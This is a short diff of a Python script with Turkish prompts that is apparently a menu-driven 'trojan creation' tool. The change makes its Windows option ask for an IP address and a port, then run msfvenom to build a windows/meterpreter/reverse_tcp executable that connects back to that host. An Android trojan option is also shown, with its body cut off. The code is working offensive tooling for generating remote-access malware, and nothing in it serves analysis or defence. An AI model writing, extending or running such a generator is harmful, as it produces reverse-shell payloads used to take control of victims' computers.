@@ -12,8 +12,10 @@ seçim = input("Lütfen Yapmak İstediğiniz İşlemi Seçiniz:")
 
 def windowsTrojanOluşturma():
     print("""Windows Trojan Oluşturma Programına Hoş Geldiniz""")
+    ip = input("Lütfen Yerel Veya Dış İP Giriniz:")
+    Port= input("Lütfen Portunuzu Giriniz")
     trojan = input("Lütfen Oluşturmak İstediğiniz Trojanın Adını Giriniz: ")
-    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f exe > {trojan}.exe")
+    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={Port} -f exe > {trojan}.exe")
 
 def androidTrojanOluşturma():
     print("""Android Trojan Oluşturma Programına Hoş Geldiniz""")
